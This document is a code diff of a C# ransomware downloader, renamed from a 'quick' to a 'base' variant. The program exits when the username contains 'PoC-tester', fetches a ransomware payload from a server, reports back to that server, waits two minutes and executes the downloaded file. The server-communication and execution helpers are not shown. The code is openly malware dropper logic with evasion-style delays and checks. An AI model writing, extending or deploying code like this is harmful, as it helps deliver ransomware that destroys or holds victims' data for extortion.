@@ -6,7 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace RansomwareDownloader
+namespace RansomwareBaseDownloader
 {
     class Program
     {
@@ -23,9 +23,11 @@ namespace RansomwareDownloader
             if (Environment.UserName.Contains("PoC-tester")) return;
             Thread.Sleep(2000);
             serverCommunicator.setRansomwareFilePath();
-            serverCommunicator.getQuickRansomware();
+            serverCommunicator.getBaseRansomware();
             Thread.Sleep(2000);
             //Install ransomware
+
+            serverCommunicator.postBaseTaken();
 
             Thread.Sleep(5000);
 
@@ -33,12 +35,11 @@ namespace RansomwareDownloader
 
             Thread.Sleep(8000);
 
-            serverCommunicator.postQuickFetched();
+            serverCommunicator.postBaseFetched();
 
-            Thread.Sleep(2000);
+            Thread.Sleep(120000);
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
-
 
 
             //Play ransomware
